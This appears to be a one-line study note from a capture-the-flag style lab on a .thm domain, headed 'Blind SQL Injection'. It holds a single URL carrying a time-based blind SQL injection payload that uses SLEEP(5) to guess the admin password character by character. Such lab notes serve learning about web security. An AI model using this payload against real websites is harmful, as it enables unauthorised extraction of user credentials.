Blind SQL Injection

```
https://website.thm/analytics?referrer=referrer=admin123' UNION SELECT SLEEP(5),2 from users where username='admin' and password like '4961%';
```

